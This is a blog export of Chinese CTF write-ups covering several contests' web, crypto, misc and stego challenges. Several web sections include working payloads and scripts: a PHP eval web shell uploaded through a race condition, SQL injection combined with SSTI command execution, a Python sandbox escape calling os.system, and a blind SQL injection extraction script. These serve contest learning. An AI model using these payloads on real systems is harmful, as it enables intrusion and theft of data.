<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2018山东省省赛(科来杯)WriteUp</title>
    <url>/2018/11/06/2018-shan-dong-sheng-sheng-sai-ke-lai-bei-writeup/</url>
    <content><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><p>根据提示<code>“你的IP地址不在允许范围内“</code>，在请求头添加<code>X-Forwarded-For:127.0.0.1</code>，</p>
<p>根据提示<code>“你不是管理员”</code>，修改cookie<code>admin</code>的值为1。</p>
<p>得到flag。</p>
<h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><p>第一关给出了源码，考察的是变量覆盖+弱类型比较</p>
<pre><code class="php">&lt;?php

    include &#39;here.php&#39;;
    $key = &#39;kelaibei&#39;;

    if(isset($_GET[&#39;id&#39;]))&#123;
        $id = $_GET[&#39;id&#39;];
        @parse_str($id);
        if ($key[99] != &#39;aabg7XSs&#39; &amp;&amp; md5($key[99]) == md5(&#39;aabg7XSs&#39;)) &#123;
           echo $hint;
        &#125;
        else&#123;
            echo &#39;try again&#39;;
        &#125;
    &#125;
    else&#123;
        show_source(__FILE__);
    &#125;</code></pre>
<p>payload：</p>
<pre><code class="php">/?id=key[99]=314282422</code></pre>
<p>第二关</p>
<p>有一个表单，输入文件名和内容来创建文件并返回路径。但当我们去访问返回的文件路径时，内容变成了<code>too solw!</code>,能注意到submit之后有一个短暂的停顿时间才返回路径。</p>
<p>它的逻辑是，上传后创建该文件，有一个1或2秒的sleep才返回路径，在sleep执行完后执行的应该是覆盖该文件内容的操作，也就是<code>too slow</code>，也就是说等我们发出的请求返回时，文件内容已经被覆盖了。在覆盖前访问到该文件就会返回flag，并不用执行命令。</p>
<p><img src="/images/2018shengsai/web2.png"></p>
<p>解题思路是：写个脚本不停的请求该文件。</p>
<p>当时的脚本：</p>
<pre><code class="python">import requests
import threading
S = requests.session()
burp0_url = &quot;http://47.105.148.65:29002/upl04d50m3thing.php?filename=shell.php&amp;content=%3C%3Fphp+%40eval%28%24_POST%5B%27a%27%5D%29%3B+%3F%3E&quot;
burp0_cookies = &#123;&quot;PHPSESSID&quot;: &quot;9f53c39f9d92b155eef84f566a85af1c&quot;, &quot;session&quot;: &quot;.eJwNj01rg0AQQP9KmbMHs91ehB5Sti6mzIhiCLO3fCzq6NhiG9oY8t_r_T0e7w7Hi_YTZD_zNSbQXyDbJDB9TucI2R2eTpABamXJtTduimeU_UKyNehroWX7ywZv5KoXlrcOpfgjX6VBWkOH3RD8fkHXWlIa-ZCPvKz-cjastZIbhSQXMkWKknfcBCUZLAnb0u-UZTClo5FcLaXPO9R6QGk32NQS_HvKioZ0bUi1coNlE_rg8RUeCVy_4zwddR2Aptf4EeNXnOHxDwKRTN0.DsLJEg.b1wYSUwY1h1HFFHsrhU-6zGDaCE&quot;, &quot;admin&quot;: &quot;0&quot;&#125;
burp0_headers = &#123;&quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;, &quot;Referer&quot;: &quot;http://47.105.148.65:29002/upl04d50m3thing.php?filename=shell.php&amp;content=aa&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9&quot;, &quot;Connection&quot;: &quot;close&quot;&#125;
def up():
    burp0_url = &quot;http://47.105.148.65:29002/upl04d50m3thing.php?filename=shell.php&amp;content=%3C%3Fphp+%40eval%28%24_POST%5B%27a%27%5D%29%3B+%3F%3E&quot;
    a=S.get(burp0_url,headers=burp0_headers, cookies=burp0_cookies)

def shell():
            url2=&quot;http://47.105.148.65:29002/uploads/8af92ffefda7050707590b352dfb3cd2e03d29a6/shell.php&quot;
    data=&#123;&#39;a&#39;:&#39;system(\&#39;pwd\&#39;);&#39;&#125;
    b=S.get(url2,headers=burp0_headers, cookies=burp0_cookies,data=data)
    print b.text

for i in range(10):
    a = threading.Thread(target=up)
    b = threading.Thread(target=shell)
    a.start()
    b.start()

for i in range(10):
    a.join()
    b.join()</code></pre>
<p>当时以为要传shell执行命令来着。其实可以更简单的脚本，循环请求该文件，手动submit就ok了。</p>
<pre><code class="python">import requests
def up():
    url = &quot;http://47.105.148.65:29002/uploads/635e1c31153cc410cb61e8997f7c0458fb72785f/shell.php&quot;
    a=requests.get(burp0_url)
    print a.text
while(True):
    up()
###web页面手动提交就ok</code></pre>
<h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><p>search处存在注入，但flag不在数据库中，因为查询的结果在渲染时没处理直接进行渲染所以这里存在ssti。</p>
<p>所以这是个注入和ssti的题目，通过union select控制查询结果实现ssti。</p>
<pre><code class="php">http://47.105.148.65:29003/?username=%27union+select+1,%22&#123;&#123;config&#125;&#125;,3%20%23</code></pre>
<p><img src="/images/2018shengsai/web3-1.png"></p>
<p>没什么过滤的，执行命令输出flag。</p>
<pre><code class="php">http://47.105.148.65:29003/?username=%27union+select+1,%22&#123;&#123;().__class__.__mro__[1].__subclasses__()[59].__init__.func_globals.linecache.os.popen('cat /flag').read()&#125;&#125;%22,3%20%23</code></pre>
<p><img src="/images/2018shengsai/web3-1.png"></p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h3><blockquote>
<p>二进制、八进制、十进制、十六进制，你能分的清吗？</p>
</blockquote>
<p>附件：</p>
<pre><code>d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e</code></pre>
<p>写脚本匹配一下就ok：</p>
<pre><code class="python">import re
s=&quot;d87 x65 x6c x63 o157 d109 o145 b100000 d116 b1101111 o40 x6b b1100101 b1101100 o141 d105 x62 d101 b1101001 d46 o40 d71 x69 d118 x65 x20 b1111001 o157 b1110101 d32 o141 d32 d102 o154 x61 x67 b100000 o141 d115 b100000 b1100001 d32 x67 o151 x66 d116 b101110 b100000 d32 d102 d108 d97 o147 d123 x31 b1100101 b110100 d98 d102 b111000 d49 b1100001 d54 b110011 x39 o64 o144 o145 d53 x61 b1100010 b1100011 o60 d48 o65 b1100001 x63 b110110 d101 o63 b111001 d97 d51 o70 d55 b1100010 d125 x20 b101110 x20 b1001000 d97 d118 o145 x20 d97 o40 d103 d111 d111 x64 d32 o164 b1101001 x6d o145 x7e&quot;
s = s.split(&quot; &quot;)
slen = len(s)
for i in range(slen):
    if re.match(&quot;d()&quot;,s[i]):
        s[i] = s[i][1:]
    elif re.match(&quot;x()&quot;,s[i]):
        s[i] = int(s[i][1:],16)
    elif re.match(&quot;o()&quot;,s[i]):
        s[i] = int(s[i][1:],8)
    elif re.match(&quot;b()&quot;,s[i]):
        s[i] = int(s[i][1:],2)

flag = &#39;&#39;
for i in range(slen):
    flag += chr(int(s[i]))
print flag</code></pre>
<h3 id="crack-it"><a href="#crack-it" class="headerlink" title="crack it"></a>crack it</h3><pre><code>flag:hellokitty</code></pre>
<p><img src="/images/2018shengsai/crackit.png"></p>
<h3 id="basic"><a href="#basic" class="headerlink" title="basic"></a>basic</h3><p>绘图，给了共135000行rgb值，长宽的话爆破一下135000的因子就有了。</p>
<pre><code class="python">#-*- coding:utf-8-*-

from PIL import Image

file = open(&#39;basic.txt&#39;, &#39;r&#39;)

x = 75    #因式分解135000
y = 1800

IM = Image.new(&quot;RGB&quot;, (x, y))

for i in range(x):
    for j in range(y):
        line = file.readline()
        e = line.strip().lstrip(&#39;(&#39;).rstrip(&#39;)&#39;) #去除左右括号
        tmp = e.split(&#39;,&#39;)
        #print tmp
        IM.putpixel((i, j), (int(tmp[0]), int(tmp[1]), int(tmp[2])))

IM.show(&#39;pic.png&#39;) #存储图片为pic</code></pre>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>Wiener-attack</p>
<p>Ctf-rsa-tools    一把梭</p>
<pre><code>N : 460657813884289609896372056585544172485318117026246263899744329237492701820627219556007788200590119136173895989001382151536006853823326382892363143604314518686388786002989248800814861248595075326277099645338694977097459168530898776007293695728101976069423971696524237755227187061418202849911479124793990722597
e : 354611102441307572056572181827925899198345350228753730931089393275463916544456626894245415096107834465778409532373187125318554614722599301791528916212839368121066035541008808261534500586023652767712271625785204280964688004680328300124849680477105302519377370092578107827116821391826210972320377614967547827619

enc : 38230991316229399651823567590692301060044620412191737764632384680546256228451518238842965221394711848337832459443844446889468362154188214840736744657885858943810177675871991111466653158257191139605699916347308294995664530280816850482740530602254559123759121106338359220242637775919026933563326069449424391192</code></pre>
<p><img src="/images/2018shengsai/rsa.png"></p>
<h3 id="affine"><a href="#affine" class="headerlink" title="affine"></a>affine</h3><blockquote>
<p>y = 17*x-8 </p>
<p>flag{szzyfimhyzd}</p>
</blockquote>
<p>仿射加密</p>
<pre><code class="python">def affine(a, b):
    pwd = &#123;&#125;
    for i in range(26):
        pwd_dic[chr(((a*i+b)%26+97))] = chr(i+97)
    return pwd_dic

if __name__ == &#39;__main__&#39;:
    pwd_dic = &#123;&#125;
    pwd = &#39;szzyfimhyzd&#39;
    plain = []
    pwd_dic = affine(17, -8)
    #print pwd_dic
    for i in pwd:
        plain.append(pwd_dic[i])
    print &quot;Flag is : &quot; + &quot;&quot;.join(plain)
</code></pre>
<h3 id="神秘的代码"><a href="#神秘的代码" class="headerlink" title="神秘的代码"></a>神秘的代码</h3><p>xor+aes_ecb</p>
<p>先异或两个info文件</p>
<pre><code class="python">file1 = file(&#39;info_clear.txt&#39;,&#39;rb&#39;)
file2 = file(&#39;info_crypt.txt&#39;,&#39;rb&#39;)
f1 = file1.read()
f2 = file2.read()
out=&#39;&#39;
for i in range(len(f1)):
    out += chr(ord(f1[i])^ord(f2[i]))
print out
file1.close()
file2.close()</code></pre>
<p>得到如下信息：</p>
<pre><code>i am a hydre agenT, coverly spying on the superHeroes. I am aware of the group that iS going to aTtack you...but Hydra has had its diffErences with you in the past, so i&#39;m not going to maKe it vEry simple for You ....ecb...aes(I Vouch for this: 12345)...md5(this)...base64...</code></pre>
<p>将大写字母提取出来，是<code>THISTHEKEYIV</code>.但这并不是aes的key，key值是整段话的md5。（emmmm）</p>
<pre><code class="python">import hashlib
import base64
from Crypto.Cipher import AES

file1 = file(&#39;info_clear.txt&#39;,&#39;rb&#39;)
file2 = file(&#39;info_crypt.txt&#39;,&#39;rb&#39;)
file3 = file(&#39;true_crypto.txt&#39;,&#39;rb&#39;)
f1 = file1.read()
f2 = file2.read()
f3 = base64.b64decode(file3.read())

out=&#39;&#39;
for i in range(len(f1)):
    out += chr(ord(f1[i])^ord(f2[i]))
key = hashlib.md5(out.rstrip(&#39;\n&#39;)).hexdigest()
cipher = AES.new(key, AES.MODE_ECB)
flag = cipher.decrypt(f3)
print flag

file1.close()
file2.close()
file3.close()

#Congratulations, you got the real flag, the flag is - flag&#123;4eS_3Cb_Us3_mD5_key&#125;! :)</code></pre>
<h2 id="Stego"><a href="#Stego" class="headerlink" title="Stego"></a>Stego</h2><h3 id="啊哒"><a href="#啊哒" class="headerlink" title="啊哒"></a>啊哒</h3><p>binwalk分离出个压缩包</p>
<p>exif信息是一串十六进制，转成字符串是压缩包密码</p>
<p>解压得到flag</p>
<h3 id="神秘的文件"><a href="#神秘的文件" class="headerlink" title="神秘的文件"></a>神秘的文件</h3><p>明文攻击</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Bugku的CTF部分WP</title>
    <url>/2017/07/12/bugku-de-ctf-bu-fen-wp/</url>
    <content><![CDATA[<h1 id="Bugku-CTF部分WP"><a href="#Bugku-CTF部分WP" class="headerlink" title="Bugku-CTF部分WP"></a>Bugku-CTF部分WP</h1><h3 id="隐写2"><a href="#隐写2" class="headerlink" title="隐写2"></a>隐写2</h3><p>通过png改高度隐藏flag。</p>
<p>先来了解一下png的头文件。</p>
<p><img src="http://omfp4wyym.bkt.clouddn.com/blog/20170712/103156061.png" alt="mark"></p>
<p><code>89 50 4E 47 0D 0A 1A 0A </code>  ——&gt;PNG头部署名域，表示这是一个PNG图片</p>
<p><code>00 00 00 0D </code>                         ——-&gt;描述IHDR头部的大小</p>
<p><code>49 48 44 52</code>                         ——&gt;是Chunk Type Code, 这里Chunk Type Code=IHDR</p>
<p><code>F9 7D AA 93</code>                         ——&gt;对IHDR的CRC校验</p>
<p><code>00 00 01 F4</code>                         ——&gt;图像宽度，500像素</p>
<p><code>00 00 01 A4</code>                         ——&gt;图像高度。</p>
<p>本来图像高度是420,改成500就出来flag了。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CISCN2018 WriteUp</title>
    <url>/2018/04/29/ciscn2018-wp/</url>
    <content><![CDATA[<h2 id="From-一个更响亮的队名"><a href="#From-一个更响亮的队名" class="headerlink" title="From 一个更响亮的队名"></a>From 一个更响亮的队名</h2><a id="more"></a>



<h2 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h2><p>登陆时用户名为admin，密码置空，登陆进去拿到flag。</p>
<p><img src="/images/ciscn2018/web1.png" alt="web1"></p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="flag-in-your-hand"><a href="#flag-in-your-hand" class="headerlink" title="flag_in_your_hand"></a>flag_in_your_hand</h3><pre><code class="python">a = [118, 104, 102, 120, 117, 108, 119, 124, 48,123,101,121]
flag=&#39;&#39;
for i in range(len(a)):
    flag += chr(a[i]-3)

print flag 
#security-xbv</code></pre>
<p><img src="/images/ciscn2018/flag-in-u-hand.png" alt="flag-in-u-hand"></p>
<h3 id="SM"><a href="#SM" class="headerlink" title="SM"></a>SM</h3><pre><code class="python">from Crypto.Util.number import getPrime,long_to_bytes,bytes_to_long
from Crypto.Cipher import AES
import hashlib
import base64

f = open(&#39;ps&#39;).read()
ps = f.split(&quot;\r\n&quot;)
for i in range(len(ps)):
    ps[i] = bin(int(ps[i]))[2:]        


r = 6753785483255906709117615805253027649453460653974415214642466102672301763943358839905575042938258141827000621474498066533397472809407687579125519939754658
ef = &#39;5eFo3ANg2fu9LRrFktWCJmVvx6RgBFzd0R8GXQ8JD78==&#39;
br = bin(r)[2:]

ok = []
#print len(br),len(ps)
for i in range(511,-1,-1):    #len(br)-1 -- 0
    for j in range(512):        #512
        if ps[j][i] == &#39;1&#39; and &#39;1&#39; not in ps[j][i+1:]:
            mark = 0
            for k in ok:
                mark ^= int(ps[k][i])
            if mark ^ int(br[i]) == 1:
                ok.append(j)
                break

bchoose = &#39;&#39;
for i in range(512):
    if i in ok:
        bchoose += &#39;1&#39;
    else:
        bchoose += &#39;0&#39;

choose = int(bchoose,2)

key=long_to_bytes(int(hashlib.md5(long_to_bytes(choose)).hexdigest(),16))
aes_obj = AES.new(key, AES.MODE_ECB)
print aes_obj.decrypt(base64.b64decode(ef))
#flag&#123;shemir_alotof_in_wctf_fun!&#125;
</code></pre>
<p><img src="/images/ciscn2018/sm.png" alt="sm"></p>
<h3 id="interesting"><a href="#interesting" class="headerlink" title="interesting"></a>interesting</h3><pre><code class="python">import hashlib
from Crypto.Util.number import getPrime, long_to_bytes, bytes_to_long
from Crypto.Cipher import AES
import random
import base64
def gen_iv(seed):
    s=random.Random()
    s.seed(seed)
    while True:
        iv=long_to_bytes(s.randint(0xfffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff))
        if hashlib.sha256(iv).hexdigest()[0:4]==hashlib.sha256(long_to_bytes(seed)).hexdigest()[0:4]:
            return iv
def gen_password(seed):
    s=random.Random()
    s.seed(seed)
    while True:
        password=long_to_bytes(s.randint(0xfffffffffffffffffffffffffffffff,0xffffffffffffffffffffffffffffffff))
        if hashlib.sha256(password).hexdigest()[4:8]==hashlib.sha256(long_to_bytes(seed)).hexdigest()[4:8]:
            return password
m=&quot;token=5t43g5g2j1;admin=0;group=0&quot;
c=&quot;bMPWOsg+YH0eSwchPY6HTEvf3ESETSrEQ3/M1d0lUm0=&quot;.decode(&quot;base64&quot;)
evil_c=c[:23]+c[23]
new_c=c[:7]+chr(ord(c[7])^ord(&#39;0&#39;)^ord(&#39;1&#39;))+c[8:]
new_c2=c[:15]+chr(ord(c[15])^ord(&#39;0&#39;)^ord(&#39;1&#39;))+c[16:]
new_c3=c[:7]+chr(ord(c[7])^ord(&#39;0&#39;)^ord(&#39;1&#39;))+c[8:15]+chr(ord(c[15])^ord(&#39;0&#39;)^ord(&#39;1&#39;))+c[16:]
monster=new_c3
seed=int(hashlib.sha256(monster).hexdigest(),16)
iv=gen_iv(seed)
password=gen_password(seed)
cipher = AES.new(password, AES.MODE_CBC, iv)
msg=open(&#39;heheda.txt&#39;,&#39;rb&#39;).read().decode(&#39;hex&#39;)
c = cipher.decrypt(msg)
#print c
while c[-1]==&#39;A&#39;:
    c=c[:-1]
c=int(c,10)
#print hex(c)[2:-1].decode(&#39;hex&#39;)
d=hex(c)[2:-1].decode(&#39;hex&#39;)
d=base64.b64decode(d)
d=base64.b32decode(d)
d=base64.b32decode(d)
d=base64.b64decode(d)
d=d.decode(&#39;hex&#39;)
d=base64.b32decode(d)
d=base64.b64decode(d)
d=base64.b32decode(d)
d=base64.b64decode(d)
d=d.decode(&#39;hex&#39;)
d=d.decode(&#39;hex&#39;)
d=d.decode(&#39;hex&#39;)
d=base64.b64decode(d)
d=d.decode(&#39;hex&#39;)
d=d.decode(&#39;hex&#39;)
print d
#</code></pre>
<p><img src="/images/ciscn2018/interesting.png" alt="interesting"></p>
<h3 id="oldstreamgame"><a href="#oldstreamgame" class="headerlink" title="oldstreamgame"></a>oldstreamgame</h3><p>爆破，跑了4个多小时…..</p>
<pre><code class="python">import base64

def lfsr(R,mask):
    output = (R &lt;&lt; 1) &amp; 0xffffffff
    i=(R&amp;mask)&amp;0xffffffff
    lastbit=0
    while i!=0:
        lastbit^=(i&amp;1)
        i=i&gt;&gt;1
    output^=lastbit
    return (output,lastbit)
mask = 0b10100100000010000000100010010100
         #10010010011000100000000111010111
key = [32, 253, 238, 248, 164, 201, 244, 8, 63, 51, 29, 168, 35, 138, 229, 237, 8, 61, 240, 203, 14, 122, 131, 53, 86, 150, 52, 93, 244, 77, 124, 24, 108, 31, 69, 155, 206, 19, 95, 29, 182, 199, 103, 117, 213, 220, 186, 183, 167, 131, 228, 138, 32, 60, 25, 202, 37, 194, 47, 96, 174, 98, 179, 125, 232, 228, 5, 120, 227, 167, 120, 126, 180, 41, 115, 13, 149, 201, 225, 148, 66, 136, 235, 62, 46, 116, 125, 130, 22, 164, 120, 85, 7, 161, 55, 180, 19, 205, 105, 12]
a = 0
for R in range(pow(2,31),pow(2,32)):
    flag = True
    r = R
    print(a)
    a += 1
    for i in range(100):
        tmp = 0
        for j in range(8):
            (R, out) = lfsr(R, mask)
            tmp = (tmp &lt;&lt; 1) ^ out
        if tmp != key[i]:
            flag = False
            break
    if flag:
        print(&quot;flag&#123;&quot; + bin(r)[2:] + &quot;&#125;&quot;)
        break</code></pre>
<p><img src="/images/ciscn2018/old.jpg" alt="old"></p>
<p><img src="/images/ciscn2018/old2.png" alt="old2"></p>
<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="验证码（签到版）"><a href="#验证码（签到版）" class="headerlink" title="验证码（签到版）"></a>验证码（签到版）</h3><p>输入验证码，得到flag</p>
<h3 id="Picture"><a href="#Picture" class="headerlink" title="Picture"></a>Picture</h3><p>binwalk分离出文本文件：97E4，内容为base64编码后的，将其解码后存为新文件。因为是个比较明显的压缩文件，前两位错位了，手动修正后可以正常打开，里面有个code文件，有密码，注释里提示了密码为报错中的内容，搜索得知密码应为integer division or modulo by zero,解压得到code文件，根据格式用uudecode解出key.txt.得到falg。CISCN{5210A198A4253FF2541833665AC5B94F}</p>
<p>97E4:</p>
<pre><code>S1ADBBQAAQAAAE0wl0ynPOJhWgAAAE4AAAAEAAAAY29kZVmbl9yAjdBdFP/dG/1FDP0ukDBQb9qt5LUn+UsSEd/ECCvK7A+5WyGaWgHSYOFaqK+qP9IU8r6FD+mL7KSlds3nqn0vd9NSsAlWGzsr2YkBhjk1mMfglGM3plBLAQI/ABQAAQAAAE0wl0ynPOJhWgAAAE4AAAAEACQAAAAAAAAAIAAAAAAAAABjb2RlCgAgAAAAAAABABgAAIU4mYXa0wHiHQeth9rTAeIdB62H2tMBUEsFBgAAAAABAAEAVgAAAHwAAADcAFtQeXRob24gMi43XQ0KPj4+IKh9qH2ofQ0KDQpUcmFjZWJhY2sgKG1vc3QgcmVjZW50IGNhbGwgbGFzdCk6DQogIEZpbGUgIjxweXNoZWxsIzA+IiwgbGluZSAxLCBpbiA8bW9kdWxlPg0KICAgIKh9qH2ofQ0KWmVyb0RpdmlzaW9uRXJyb3I6IKh9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofah9qH2ofSA8LSBwYXNzd29yZCA7KQ0KPj4+IAA=</code></pre>
<h3 id="寻找入侵者"><a href="#寻找入侵者" class="headerlink" title="寻找入侵者"></a>寻找入侵者</h3><p>将attack.pcapng导出为txt，列出全部网卡地址。</p>
<pre><code class="python">import re

file = open(&#39;attack.txt&#39;,&#39;r&#39;)
data = file.read()

result = re.findall(&#39;\w*:\w*:\w*:\w*:\w*:\w*&#39;,data)

#for i in range(len(result)):
dicdata = set(result)

file.close()

dic = open(&#39;dic.txt&#39;,&#39;w&#39;)

for i in dicdata:
    dic.write(i+&quot;\n&quot;)

dic.close()</code></pre>
<p>用aircrack-ng爆破hanshake.cap,得到密码为88:25:93:c1:c8:eb,用airdecap-ng解包后分析http流发现了“wiattack.net/HR2D1k5cVc/key.rar”,去访问得到key.rar文件，解压得到key.pcap，直接用命令列字符串。</p>
<p><code>strings key.pcap</code>,在最后一行的字符串即是flag。</p>
<p><img src="/images/ciscn2018/ruqinzhe.png" alt="ruqinzhe"></p>
<p><img src="/images/ciscn2018/rqz2.png" alt="rqz2"></p>
<h3 id="RUN"><a href="#RUN" class="headerlink" title="RUN"></a>RUN</h3><p>拿到题目，nc连接之后得到一个命令交互会话。</p>
<p>根据提示是个python环境，并且要拿到shell获取flag。那么很明显了，这是一个python沙箱环境，要进行逃逸获取shell。</p>
<p>首先尝试导入能执行系统命令的模块，当然，直接给报错了。然后又尝试一下import其他不敏感的模块，全都是返回ban。那么这里应该是对所有Import进行了拦截。</p>
<p>那么直接上一种彪悍的方式，python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的，</p>
<p>Payload: ().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[59].<strong>init</strong>.func_globals[‘linecache’].<strong>dict</strong>[‘o’+’s’].<strong>dict</strong>[‘sy’+’stem’]<a href="">(‘l</a>‘+’s’) </p>
<p>但是就是在这里出现了一个很头疼的事，这个沙箱还过滤了敏感命令，比如os，ls ，sys，cat全都进行了过滤。而非常巧的是，func_globals里面包含了ls这个字符串，而这里又不能用字符串拼接的方式进行拼接。在这里饶了一大圈，尝试几种方式都没有成功。然后查了一大波文档，最终找到了一个非常有意思的方式。<strong>getattribute</strong></p>
<p> 示例： </p>
<p>x.<strong>getattribute</strong>(‘name’) &lt;==&gt;x.name</p>
<p>那么这里可以看出，object x可以使用__getattribute__方法，这样name就变为字符串，也就达到了我们可以拼接的要求。</p>
<p>那么上面的payload可以改为：</p>
<p>().<strong>class</strong>.<strong>bases</strong>[0].<strong>subclasses</strong>()[59].<strong>init</strong>.<strong>getattribute</strong>(‘func_global’+’s’)[‘linecache’].<strong>dict</strong>[‘o’+’s’].<strong>dict</strong><a href="'l%E2%80%98+%E2%80%99s'">‘sy’+’stem’</a></p>
<p>那么就可以直接读取flag.flag文件位于home/ctf/目录下成功拿到一个shell。<img src="/images/ciscn2018/run1.png" alt="run1"></p>
<p><img src="/images/ciscn2018/run2.png" alt="run2"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>DDCTF的部分WriteUp</title>
    <url>/2018/05/17/ddctf-de-bu-fen-writeup/</url>
    <content><![CDATA[<blockquote>
<p>因为筹备校赛当时写了一半的wp拖了快一个月才写完，今天发现DDCTF的平台和题目竟然还开着(⊙v⊙)，很良心啊，当时也没有怎么去做题，水了几个misc，web涨姿势了，好菜_(:з」∠)_</p>
</blockquote>
<a id="more"></a>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="数据库的秘密"><a href="#数据库的秘密" class="headerlink" title="数据库的秘密"></a>数据库的秘密</h2><p>先是XFF绕过，有三个搜索框，还有一个隐藏的author参数。注入点在author。</p>
<p>有js进行签名和加时间戳，python可以调用execjs库执行js，就可以进行盲注啦。</p>
<pre><code class="python">import requests
import execjs
import time

flag = &#39;&#39;
key=&quot;\141\144\162\145\146\153\146\167\145\157\144\146\163\144\160\151\162\165&quot;
url=&quot;http://116.85.43.88:8080/ZODGIRYTDIETBCSI/dfe3ia/index.php?sig=&quot;
chrs=&quot;DCTFABEGHIJKLMNOPQRSUVWXYZabcdefghijklmnopqrstuvwxyz\&#123;\&#125;!#$%&amp;&#39;()*+,-./0123456789:;&lt;=&gt;?@[\]^_`&quot;

header=&#123;
    &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)Chrome/65.0.3325.181 Safari/537.36&quot;,
    &quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8&quot;,
    &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9&quot;,
    &quot;X-Forwarded-For&quot;: &quot;123.232.23.245&quot;,
    &quot;Connection&quot;: &quot;close&quot;,
    &quot;Content-Length&quot;:&quot;38&quot;,
    &quot;Cache-Control&quot;: &quot;max-age=0&quot;,
    &quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,
    &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;
&#125;

def load_jd():
    file = open(&#39;change.js&#39;,&#39;r&#39;)
    js = file.read()
    return js

def get_sig(sqlin,time1):
    js = load_jd()
    ctx = execjs.compile(js)
    sig=ctx.call(&#39;submitt&#39;,sqlin,time1)
    return sig

def check(sqlin):
    global header
    time1 = str(int(time.time()))
    new_url = url + get_sig(sqlin,time1) + &quot;&amp;time=&quot; + time1
    post_data = &#123;
        &#39;id&#39;:&#39;&#39;,
        &#39;title&#39;:&#39;&#39;,
        &#39;author&#39;:sqlin,
        &#39;data&#39;:&#39;&#39;,
        &#39;time&#39;:time1
    &#125;
    reqs = requests.post(url=new_url,data=post_data,headers=header)
    data = reqs.content
    if &quot;admin&quot; in data:
        return 1
    else:
        return 0

def main():
    global flag
    num = 1
    while True:
        for i in chrs:
            sqlin = &quot;admin&#39; &amp;&amp; binary substr((SELECT secvalue from ctf_key4),1,&quot; + str(num) + &quot;)=&#39;&quot; + flag + i + &quot;&#39;# &quot;
            if check(sqlin) == 1:
                flag += i
                num += 1
                print flag
                break
        if flag[-1] == &#39;&#125;&#39;:
            break

if __name__ == &#39;__main__&#39;:
    main()


#SELECT group_concat(schema_name) from information_schema.schemata
#SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;ddctf&#39;
#SELECT group_concat(column_name) from information_schema.columns where table_schema=&#39;ddctf&#39; and table_name=&#39;ctf_key4&#39;secvalue
#SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;ctf_key4&#39;)
#DDCTF&#123;MSBMCTFMXOCBYFYI&#125;</code></pre>
<p>​    有大佬直接本地写个代理页面处理签名和时间戳上sqlmap一把梭，见下题引用链接..</p>
<h2 id="专属链接"><a href="#专属链接" class="headerlink" title="专属链接"></a>专属链接</h2><p>html中发现文件读取，但是只能读<code>.class .xml .ico .ks</code>的文件，根据springmvc框架结构去找源码…做到这就晚上了，后来因为其他事就搁置了，太菜了啊ಥ_ಥ</p>
<p>附上大佬的wp：</p>
<blockquote>
<p><a href="https://blog.csdn.net/like98k/article/details/80057417">https://blog.csdn.net/like98k/article/details/80057417</a></p>
<p><a href="https://www.anquanke.com/post/id/144879">https://www.anquanke.com/post/id/144879</a></p>
</blockquote>
